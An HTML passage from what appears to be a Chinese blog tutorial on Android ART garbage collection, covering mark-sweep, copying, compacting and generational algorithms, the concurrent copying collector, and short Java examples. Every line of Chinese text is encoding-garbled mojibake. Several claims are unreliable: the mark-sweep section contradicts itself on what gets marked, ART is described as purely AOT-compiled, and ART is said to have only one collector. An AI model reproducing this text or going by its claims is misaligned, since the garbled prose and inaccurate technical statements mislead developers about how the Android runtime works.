<li>ä¸»è¦ç”¨äºç‰¹æ®Šåœºæ™¯ï¼ˆå¦‚ç›´æ¥å†…å­˜çš„æ¸…ç†ï¼‰</li>
</ul>
<h4 data-id="heading-7">1.3 Androidä¸­çš„å¯¹è±¡å›æ”¶</h4>
<p><strong>å †å†…å­˜å›æ”¶ï¼š</strong></p>
<ul>
<li>ä¸»è¦å›æ”¶åŒºåŸŸ</li>
<li>å›æ”¶å¯¹è±¡å®ä¾‹ï¼ˆé€šè¿‡newåˆ›å»ºçš„å¯¹è±¡ï¼‰</li>
<li>è¿™æ˜¯GCçš„ä¸»è¦å·¥ä½œ</li>
</ul>
<p><strong>æ–¹æ³•åŒºå›æ”¶ï¼š</strong></p>
<ul>
<li>å›æ”¶ç±»ä¿¡æ¯ã€å¸¸é‡ç­‰</li>
<li>Androidä¸­è¾ƒå°‘ï¼Œå› ä¸ºç±»ä¿¡æ¯é€šå¸¸ä¸ä¼šé¢‘ç¹å˜åŒ–</li>
</ul>
<p><strong>å›æ”¶æ—¶æœºï¼š</strong></p>
<ul>
<li>ç³»ç»Ÿè‡ªåŠ¨åˆ¤æ–­ï¼Œå¼€å‘è€…ä¸éœ€è¦æ‰‹åŠ¨è§¦å‘</li>
<li>ä¸å»ºè®®è°ƒç”¨System.gc()ï¼Œå› ä¸ºä¼šå¼ºåˆ¶è§¦å‘Full GCï¼Œå¯èƒ½å¯¼è‡´å¡é¡¿</li>
</ul>
<hr/>
<h2 data-id="heading-8">ç¬¬äºŒéƒ¨åˆ†ï¼šåƒåœ¾å›æ”¶ç®—æ³•ï¼ˆAndroid ARTä½¿ç”¨çš„ç®—æ³•ï¼‰</h2>
<p><strong>è¯´æ˜ï¼šè¿™éƒ¨åˆ†ä»‹ç»GCç®—æ³•çš„åŸºæœ¬åŸç†ï¼ŒAndroid ARTä¸»è¦ä½¿ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•</strong></p>
<h3 data-id="heading-9">2. åƒåœ¾å›æ”¶ç®—æ³•</h3>
<h4 data-id="heading-10">2.1 æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼ˆMark-Sweepï¼‰</h4>
<p><strong>ç®—æ³•åŸç†ï¼š</strong></p>
<p>åˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>æ ‡è®°é˜¶æ®µ</strong>ï¼šä»GC Rootså¼€å§‹ï¼Œæ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡</li>
<li><strong>æ¸…é™¤é˜¶æ®µ</strong>ï¼šæ¸…é™¤æ‰€æœ‰è¢«æ ‡è®°çš„å¯¹è±¡</li>
</ol>
<p><strong>ç®—æ³•æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ä»GC Rootså¼€å§‹éå†
<span class="hljs-bullet">2.</span> æ ‡è®°æ‰€æœ‰å¯è¾¾å¯¹è±¡ï¼ˆå­˜æ´»å¯¹è±¡ï¼‰
<span class="hljs-bullet">3.</span> æ¸…é™¤æ‰€æœ‰æœªæ ‡è®°çš„å¯¹è±¡ï¼ˆåƒåœ¾å¯¹è±¡ï¼‰
</code></pre>
<p><strong>å›¾ç¤ºï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">æ ‡è®°å‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[å¯¹è±¡4]</span><span class="hljs-selector-attr">[å¯¹è±¡5]</span>
  âœ“      âœ—      âœ“      âœ—      âœ“
 å­˜æ´»   åƒåœ¾    å­˜æ´»   åƒåœ¾    å­˜æ´»

æ¸…é™¤åï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡5]</span>
  âœ“            âœ“            âœ“
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°ç®€å•</li>
<li>ä¸éœ€è¦ç§»åŠ¨å¯¹è±¡</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><strong>äº§ç”Ÿå†…å­˜ç¢ç‰‡</strong>ï¼šæ¸…é™¤åç•™ä¸‹ä¸è¿ç»­çš„å†…å­˜ç©ºé—´</li>
<li>æ•ˆç‡è¾ƒä½ï¼šéœ€è¦ä¸¤æ¬¡éå†ï¼ˆæ ‡è®°å’Œæ¸…é™¤ï¼‰</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li>Androidä¸ä¸»è¦ä½¿ç”¨è¿™ä¸ªç®—æ³•</li>
<li>å› ä¸ºä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡ï¼Œå½±å“åç»­å†…å­˜åˆ†é…æ•ˆç‡</li>
</ul>
<h4 data-id="heading-11">2.2 æ ‡è®°-å¤åˆ¶ç®—æ³•ï¼ˆMark-Copyï¼‰- <strong>Androidä¸»è¦ä½¿ç”¨è¿™ä¸ª</strong></h4>
<p><strong>ç®—æ³•åŸç†ï¼š</strong></p>
<p>å°†å†…å­˜åˆ†ä¸ºä¸¤å—ï¼Œæ¯æ¬¡åªä½¿ç”¨ä¸€å—ã€‚å›æ”¶æ—¶ï¼Œå°†å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—ï¼Œç„¶åæ¸…ç©ºå½“å‰å—ã€‚</p>
<p><strong>ç®—æ³•æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-number">1</span>. å°†å†…å­˜åˆ†ä¸º<span class="hljs-selector-tag">From</span>åŒºå’Œ<span class="hljs-selector-tag">To</span>åŒº
<span class="hljs-number">2</span>. å¯¹è±¡åˆ†é…åœ¨<span class="hljs-selector-tag">From</span>åŒº
<span class="hljs-number">3</span>. å›æ”¶æ—¶ï¼š
   - æ ‡è®°<span class="hljs-selector-tag">From</span>åŒºä¸­çš„å­˜æ´»å¯¹è±¡
   - å°†å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°<span class="hljs-selector-tag">To</span>åŒº
   - æ¸…ç©º<span class="hljs-selector-tag">From</span>åŒº
<span class="hljs-number">4</span>. <span class="hljs-selector-tag">From</span>åŒºå’Œ<span class="hljs-selector-tag">To</span>åŒºè§’è‰²äº’æ¢
</code></pre>
<p><strong>å›¾ç¤ºï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">å›æ”¶å‰ï¼š
FromåŒº: <span class="hljs-section">[å¯¹è±¡1]</span><span class="hljs-section">[å¯¹è±¡2]</span><span class="hljs-section">[å¯¹è±¡3]</span><span class="hljs-section">[å¯¹è±¡4]</span>
        å­˜æ´»   åƒåœ¾   å­˜æ´»   åƒåœ¾
ToåŒº:   <span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span>

å›æ”¶åï¼š
FromåŒº: <span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span><span class="hljs-section">[ç©ºé—²]</span>
ToåŒº:   <span class="hljs-section">[å¯¹è±¡1]</span><span class="hljs-section">[å¯¹è±¡3]</span>
        å­˜æ´»   å­˜æ´»
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ²¡æœ‰å†…å­˜ç¢ç‰‡</strong>ï¼šå¤åˆ¶åå†…å­˜è¿ç»­</li>
<li>å›æ”¶æ•ˆç‡é«˜ï¼šåªéœ€è¦å¤åˆ¶å­˜æ´»å¯¹è±¡</li>
<li>é€‚åˆå¹´è½»ä»£ï¼šå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼Œå­˜æ´»å¯¹è±¡å°‘</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>æµªè´¹ä¸€åŠå†…å­˜ï¼šéœ€è¦ä¸¤å—å†…å­˜ï¼Œä½†åªä½¿ç”¨ä¸€å—</li>
<li>å¯¹è±¡å­˜æ´»ç‡é«˜æ—¶æ•ˆç‡ä½ï¼šéœ€è¦å¤åˆ¶å¾ˆå¤šå¯¹è±¡</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li><strong>Android ARTä¸»è¦ä½¿ç”¨è¿™ä¸ªç®—æ³•</strong></li>
<li>é€‚åˆå¹´è½»ä»£å›æ”¶ï¼ˆå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼‰</li>
<li>é€šè¿‡ä¼˜åŒ–ï¼Œåªæµªè´¹10%çš„å†…å­˜ï¼ˆè€Œä¸æ˜¯50%ï¼‰</li>
</ul>
<p><strong>æ”¹è¿›ç®—æ³•ï¼ˆAppelå¼å›æ”¶ï¼‰ï¼š</strong></p>
<p>å°†å†…å­˜åˆ†ä¸ºEdenåŒºå’Œä¸¤ä¸ªSurvivoråŒºï¼š</p>
<ul>
<li>EdenåŒºï¼šæ–°å¯¹è±¡åˆ†é…åœ¨è¿™é‡Œ</li>
<li>Survivor0å’ŒSurvivor1ï¼šç”¨äºå­˜æ”¾å­˜æ´»å¯¹è±¡</li>
</ul>
<p><strong>é»˜è®¤æ¯”ä¾‹ï¼š</strong></p>
<ul>
<li>Eden : Survivor0 : Survivor1 = 8 : 1 : 1</li>
<li>åªæµªè´¹10%çš„å†…å­˜ï¼Œè€Œä¸æ˜¯50%</li>
</ul>
<p><strong>å·¥ä½œæµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ–°å¯¹è±¡åˆ†é…åœ¨EdenåŒº
<span class="hljs-bullet">2.</span> EdenåŒºæ»¡æ—¶ï¼Œè§¦å‘Minor GC
<span class="hljs-bullet">3.</span> å°†EdenåŒºå’ŒSurvivor0ä¸­çš„å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°Survivor1
<span class="hljs-bullet">4.</span> æ¸…ç©ºEdenåŒºå’ŒSurvivor0
<span class="hljs-bullet">5.</span> Survivor0å’ŒSurvivor1è§’è‰²äº’æ¢
</code></pre>
<h4 data-id="heading-12">2.3 æ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆMark-Compactï¼‰</h4>
<p><strong>ç®—æ³•åŸç†ï¼š</strong></p>
<p>åˆ†ä¸‰ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>æ ‡è®°é˜¶æ®µ</strong>ï¼šæ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡</li>
<li><strong>æ•´ç†é˜¶æ®µ</strong>ï¼šå°†å­˜æ´»å¯¹è±¡å‘ä¸€ç«¯ç§»åŠ¨</li>
<li><strong>æ¸…é™¤é˜¶æ®µ</strong>ï¼šæ¸…ç†è¾¹ç•Œå¤–çš„å†…å­˜</li>
</ol>
<p><strong>ç®—æ³•æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ ‡è®°æ‰€æœ‰å­˜æ´»å¯¹è±¡
<span class="hljs-bullet">2.</span> å°†å­˜æ´»å¯¹è±¡ç§»åŠ¨åˆ°ä¸€ç«¯ï¼ˆæ•´ç†ï¼‰
<span class="hljs-bullet">3.</span> æ¸…ç†è¾¹ç•Œå¤–çš„å†…å­˜
</code></pre>
<p><strong>å›¾ç¤ºï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">æ•´ç†å‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span>
  âœ“            âœ“            âœ“

æ•´ç†åï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
  âœ“      âœ“      âœ“
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li><strong>æ²¡æœ‰å†…å­˜ç¢ç‰‡</strong>ï¼šæ•´ç†åå†…å­˜è¿ç»­</li>
<li><strong>ä¸æµªè´¹å†…å­˜</strong>ï¼šä¸éœ€è¦ä¸¤å—å†…å­˜</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>æ•ˆç‡è¾ƒä½ï¼šéœ€è¦ç§»åŠ¨å¯¹è±¡ï¼Œæ›´æ–°æ‰€æœ‰å¼•ç”¨</li>
<li>é€‚åˆè€å¹´ä»£ï¼šå¯¹è±¡å­˜æ´»ç‡é«˜ï¼Œç§»åŠ¨æˆæœ¬ç›¸å¯¹è¾ƒä½</li>
</ul>
<p><strong>Androidä¸­çš„ä½¿ç”¨ï¼š</strong></p>
<ul>
<li>Androidåœ¨æŸäº›åœºæ™¯ä¸‹ä½¿ç”¨</li>
<li>ä¸»è¦ç”¨äºè€å¹´ä»£å›æ”¶ï¼ˆé¿å…å†…å­˜ç¢ç‰‡ï¼‰</li>
</ul>
<h4 data-id="heading-13">2.4 åˆ†ä»£æ”¶é›†ç®—æ³•ï¼ˆAndroidä½¿ç”¨è¿™ä¸ªç­–ç•¥ï¼‰</h4>
<p><strong>ç†è®ºåŸºç¡€ï¼š</strong></p>
<p>æ ¹æ®å¯¹è±¡ç”Ÿå‘½å‘¨æœŸä¸åŒï¼Œå°†å†…å­˜åˆ†ä¸ºä¸åŒçš„ä»£ï¼š</p>
<ul>
<li><strong>å¤§éƒ¨åˆ†å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆçŸ­</strong>ï¼šåˆ›å»ºåå¾ˆå¿«è¢«å›æ”¶</li>
<li><strong>å°‘æ•°å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆé•¿</strong>ï¼šé•¿æœŸå­˜æ´»</li>
</ul>
<p><strong>åˆ†ä»£ç­–ç•¥ï¼š</strong></p>
<p><strong>å¹´è½»ä»£ï¼ˆYoung Generationï¼‰ï¼š</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå­˜æ”¾æ–°åˆ›å»ºçš„å¯¹è±¡ï¼Œç”Ÿå‘½å‘¨æœŸçŸ­</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-å¤åˆ¶ç®—æ³•ï¼ˆå¿«é€Ÿé«˜æ•ˆï¼‰</li>
<li><strong>å›æ”¶é¢‘ç‡</strong>ï¼šé«˜ï¼ˆé¢‘ç¹å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶ç±»å‹</strong>ï¼šPartial GCï¼ˆéƒ¨åˆ†å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šçŸ­ï¼ˆå‡ æ¯«ç§’ï¼‰</li>
</ul>
<p><strong>è€å¹´ä»£ï¼ˆOld Generationï¼‰ï¼š</strong></p>
<ul>
<li><strong>ç‰¹ç‚¹</strong>ï¼šå­˜æ”¾é•¿æœŸå­˜æ´»çš„å¯¹è±¡ï¼Œç”Ÿå‘½å‘¨æœŸé•¿</li>
<li><strong>å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-æ•´ç†ç®—æ³•ï¼ˆé¿å…ç¢ç‰‡ï¼‰</li>
<li><strong>å›æ”¶é¢‘ç‡</strong>ï¼šä½ï¼ˆå¶å°”å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶ç±»å‹</strong>ï¼šFull GCï¼ˆå®Œå…¨å›æ”¶ï¼‰</li>
<li><strong>å›æ”¶æ—¶é—´</strong>ï¼šé•¿ï¼ˆå¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼‰</li>
</ul>
<p><strong>Androidä¸­çš„åˆ†ä»£æ”¶é›†ï¼š</strong></p>
<ol>
<li>
<p><strong>å¹´è½»ä»£ç”¨æ ‡è®°-å¤åˆ¶ç®—æ³•</strong></p>
<ul>
<li>å¿«é€Ÿå›æ”¶ï¼Œé€‚åˆé¢‘ç¹å›æ”¶</li>
<li>å¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶ï¼Œå¤åˆ¶æˆæœ¬ä½</li>
</ul>
</li>
<li>
<p><strong>è€å¹´ä»£ç”¨æ ‡è®°-æ•´ç†ç®—æ³•</strong></p>
<ul>
<li>é¿å…å†…å­˜ç¢ç‰‡</li>
<li>å¯¹è±¡å­˜æ´»ç‡é«˜ï¼Œç§»åŠ¨æˆæœ¬ç›¸å¯¹è¾ƒä½</li>
</ul>
</li>
<li>
<p><strong>è¿™æ ·è®¾è®¡çš„å¥½å¤„ï¼š</strong></p>
<ul>
<li>æé«˜GCæ•ˆç‡</li>
<li>å‡å°‘GCæš‚åœæ—¶é—´</li>
<li>å‡å°‘å†…å­˜ç¢ç‰‡</li>
</ul>
</li>
</ol>
<p><strong>å¯¹è±¡æ™‹å‡è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ–°å¯¹è±¡ â†’ å¹´è½»ä»£ï¼ˆEdenåŒºï¼‰
<span class="hljs-bullet">2.</span> å¹´è½»ä»£GC â†’ å­˜æ´»å¯¹è±¡ â†’ SurvivoråŒº
<span class="hljs-bullet">3.</span> å¤šæ¬¡GCåä»å­˜æ´» â†’ æ™‹å‡åˆ°è€å¹´ä»£
<span class="hljs-bullet">4.</span> è€å¹´ä»£GC â†’ å›æ”¶é•¿æœŸå­˜æ´»çš„å¯¹è±¡
</code></pre>
<hr/>
<h2 data-id="heading-14">ç¬¬ä¸‰éƒ¨åˆ†ï¼šAndroid ARTåƒåœ¾å›æ”¶å™¨</h2>
<h3 data-id="heading-15">3. Android ARTåƒåœ¾å›æ”¶å™¨ï¼ˆGarbage Collectorï¼‰</h3>
<p><strong>æ ¸å¿ƒè¯´æ˜ï¼šAndroid ARTåªæœ‰ä¸€ç§åƒåœ¾å›æ”¶å™¨ï¼Œå«åš"å¹¶å‘å¤åˆ¶æ”¶é›†å™¨"</strong></p>
<h4 data-id="heading-16">3.1 ARTä¸JVMçš„åŒºåˆ«</h4>
<p><strong>ARTï¼ˆAndroid Runtimeï¼‰ä¸æ˜¯JVMï¼š</strong></p>
<ol>
<li>
<p><strong>ç¼–è¯‘æ–¹å¼ä¸åŒ</strong>ï¼š</p>
<ul>
<li>ARTï¼šAOTç¼–è¯‘ï¼ˆAhead-Of-Timeï¼‰ï¼Œå®‰è£…æ—¶ç¼–è¯‘</li>
<li>JVMï¼šJITç¼–è¯‘ï¼ˆJust-In-Timeï¼‰ï¼Œè¿è¡Œæ—¶ç¼–è¯‘</li>
</ul>
</li>
<li>
<p><strong>GCæœºåˆ¶ä¸åŒ</strong>ï¼š</p>
<ul>
<li>ARTï¼šåªæœ‰ä¸€ç§æ”¶é›†å™¨ï¼ˆå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼‰</li>
<li>JVMï¼šæœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼ˆSerialã€Parallelã€CMSã€G1ã€ZGCç­‰ï¼‰</li>
</ul>
</li>
<li>
<p><strong>ä¼˜åŒ–æ–¹å‘ä¸åŒ</strong>ï¼š</p>
<ul>
<li>ARTï¼šé’ˆå¯¹ä½å»¶è¿Ÿä¼˜åŒ–ï¼Œé€‚åˆäº¤äº’å¼åº”ç”¨</li>
<li>JVMï¼šæœ‰å¤šç§ä¼˜åŒ–æ–¹å‘ï¼ˆååé‡ã€å»¶è¿Ÿç­‰ï¼‰</li>
</ul>
</li>
</ol>
<p><strong>ARTçš„GCä¸“é—¨ä¸ºAndroidåº”ç”¨ä¼˜åŒ–ï¼š</strong></p>
<ul>
<li>å‡å°‘å¡é¡¿ï¼šä½å»¶è¿Ÿè®¾è®¡</li>
<li>æå‡æµç•…åº¦ï¼šå¹¶å‘å›æ”¶ï¼Œå‡å°‘æš‚åœæ—¶é—´</li>
<li>é€‚åˆäº¤äº’å¼åº”ç”¨ï¼šä¼˜åŒ–ç”¨æˆ·æ»‘åŠ¨ã€ç‚¹å‡»ç­‰æ“ä½œ</li>
</ul>
<h4 data-id="heading-17">3.2 Androidçš„åƒåœ¾å›æ”¶å™¨æ˜¯ä»€ä¹ˆ</h4>
<p><strong>åªæœ‰ä¸€ä¸ªä¸»è¦çš„åƒåœ¾å›æ”¶å™¨ï¼šå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼ˆConcurrent Copyingï¼Œç®€ç§°CCï¼‰</strong></p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>Androidåªæœ‰è¿™ä¸€ç§æ”¶é›†å™¨</li>
<li>æ²¡æœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼ˆä¸åƒJVMæœ‰Serialã€Parallelã€CMSã€G1ã€ZGCç­‰ï¼‰</li>
<li>Androidå¼€å‘è€…ä¸éœ€è¦é€‰æ‹©æ”¶é›†å™¨ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨è¿™ä¸ªæ”¶é›†å™¨</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆåªæœ‰ä¸€ä¸ªï¼š</strong></p>
<ul>
<li>é’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–ï¼šä½å»¶è¿Ÿã€äº¤äº’å¼åº”ç”¨</li>
<li>ä¸éœ€è¦å¼€å‘è€…é€‰æ‹©ï¼šç³»ç»Ÿè‡ªåŠ¨ç®¡ç†</li>
<li>ç®€åŒ–å¼€å‘ï¼šå¼€å‘è€…ä¸éœ€è¦äº†è§£å¤šç§æ”¶é›†å™¨çš„åŒºåˆ«</li>
</ul>
<h4 data-id="heading-18">3.3 è¿™ä¸ªåƒåœ¾å›æ”¶å™¨æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼ˆéƒ½æ˜¯åŒä¸€ä¸ªæ”¶é›†å™¨çš„ç‰¹æ€§ï¼Œä¸æ˜¯æ­¥éª¤ï¼Œä¹Ÿä¸æ˜¯ä¸åŒçš„å›æ”¶æ–¹å¼ï¼‰</h4>
<p><strong>è¯´æ˜ï¼šè¿™äº›éƒ½æ˜¯"å¹¶å‘å¤åˆ¶æ”¶é›†å™¨"çš„ç‰¹æ€§ï¼Œå®ƒä»¬åŒæ—¶å‘æŒ¥ä½œç”¨ï¼Œè®©å›æ”¶æ›´é«˜æ•ˆã€æ›´å°‘å¡é¡¿</strong></p>
<h5 data-id="heading-19">3.3.1 åˆ†ä»£å›æ”¶ç­–ç•¥ï¼ˆå›æ”¶ç­–ç•¥ï¼‰</h5>
<p><strong>å†…å­˜åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</strong></p>
<ol>
<li><strong>å¹´è½»ä»£</strong>ï¼šå­˜æ”¾æ–°åˆ›å»ºçš„å¯¹è±¡ï¼ˆç”Ÿå‘½å‘¨æœŸçŸ­ï¼‰</li>
<li><strong>è€å¹´ä»£</strong>ï¼šå­˜æ”¾é•¿æœŸå­˜æ´»çš„å¯¹è±¡ï¼ˆç”Ÿå‘½å‘¨æœŸé•¿ï¼‰</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆåˆ†ä»£ï¼Ÿ</strong></p>
<p>å› ä¸ºå¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«å°±ä¼šè¢«å›æ”¶ï¼Œåˆ†å¼€å¤„ç†æ›´é«˜æ•ˆï¼š</p>
<ul>
<li>å¹´è½»ä»£ï¼šé¢‘ç¹å›æ”¶ï¼Œç”¨å¿«é€Ÿç®—æ³•ï¼ˆæ ‡è®°-å¤åˆ¶ï¼‰</li>
<li>è€å¹´ä»£ï¼šå¶å°”å›æ”¶ï¼Œç”¨é¿å…ç¢ç‰‡çš„ç®—æ³•ï¼ˆæ ‡è®°-æ•´ç†ï¼‰</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// è¿™äº›å¯¹è±¡åœ¨å¹´è½»ä»£</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¤§éƒ¨åˆ†å¾ˆå¿«è¢«å›æ”¶</span>
    }
    
    <span class="hljs-comment">// è¿™ä¸ªå¯¹è±¡å¯èƒ½æ™‹å‡åˆ°è€å¹´ä»£</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">longLived</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-comment">// å¦‚æœå¤šæ¬¡GCåä»å­˜æ´»ï¼Œä¼šè¿›å…¥è€å¹´ä»£</span>
}
</code></pre>
<h5 data-id="heading-20">3.3.2 å¹¶å‘å›æ”¶ï¼ˆæ‰§è¡Œæ–¹å¼ï¼‰</h5>
<p><strong>åœ¨åå°çº¿ç¨‹æ‰§è¡Œåƒåœ¾å›æ”¶ï¼š</strong></p>
<ul>
<li>å°½é‡ä¸æš‚åœä¸»çº¿ç¨‹ï¼ˆåº”ç”¨ç»§ç»­è¿è¡Œï¼‰</li>
<li>è¿™æ ·å¯ä»¥å‡å°‘å¡é¡¿</li>
</ul>
<p><strong>å¹¶å‘å›æ”¶çš„ä¼˜åŠ¿ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">ä¼ ç»Ÿå›æ”¶ï¼ˆä¸²è¡Œï¼‰ï¼š
ä¸»çº¿ç¨‹: <span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[æš‚åœGC]</span><span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[æš‚åœGC]</span><span class="hljs-section">[è¿è¡Œ]</span>
         â†“      â†“      â†“      â†“      â†“
        å¡é¡¿   å¡é¡¿   å¡é¡¿   å¡é¡¿   å¡é¡¿

å¹¶å‘å›æ”¶ï¼ˆARTï¼‰ï¼š
ä¸»çº¿ç¨‹: <span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[è¿è¡Œ]</span><span class="hljs-section">[è¿è¡Œ]</span>
         â†“
        ä¸å¡é¡¿
GCçº¿ç¨‹: <span class="hljs-section">[GC]</span><span class="hljs-section">[GC]</span><span class="hljs-section">[GC]</span>
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”¨æˆ·æ»‘åŠ¨åˆ—è¡¨æ—¶</span>
recyclerView.setOnScrollListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RecyclerView</span>.OnScrollListener() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onScrolled</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-type">int</span> dx, <span class="hljs-type">int</span> dy)</span> {
        <span class="hljs-comment">// å³ä½¿æ­¤æ—¶è§¦å‘GCï¼Œä¹Ÿä¸ä¼šå¡é¡¿</span>
        <span class="hljs-comment">// å› ä¸ºGCåœ¨åå°çº¿ç¨‹æ‰§è¡Œ</span>
    }
});
</code></pre>
<h5 data-id="heading-21">3.3.3 å¤åˆ¶ç®—æ³•ï¼ˆå›æ”¶ç®—æ³•ï¼‰</h5>
<p><strong>å›æ”¶æ—¶ï¼šæŠŠå­˜æ´»çš„å¯¹è±¡å¤åˆ¶åˆ°æ–°ä½ç½®</strong>
<strong>ç„¶åï¼šç›´æ¥æ¸…ç©ºæ—§ä½ç½®</strong></p>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>ç®€å•é«˜æ•ˆ</li>
<li>æ²¡æœ‰å†…å­˜ç¢ç‰‡</li>
</ul>
<p><strong>å·¥ä½œæµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ ‡è®°å­˜æ´»å¯¹è±¡
<span class="hljs-bullet">2.</span> å¤åˆ¶åˆ°æ–°ä½ç½®
<span class="hljs-bullet">3.</span> æ¸…ç©ºæ—§ä½ç½®
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">å›æ”¶å‰ï¼ˆ<span class="hljs-selector-tag">From</span>åŒºï¼‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[å¯¹è±¡4]</span>
 å­˜æ´»   åƒåœ¾   å­˜æ´»   åƒåœ¾

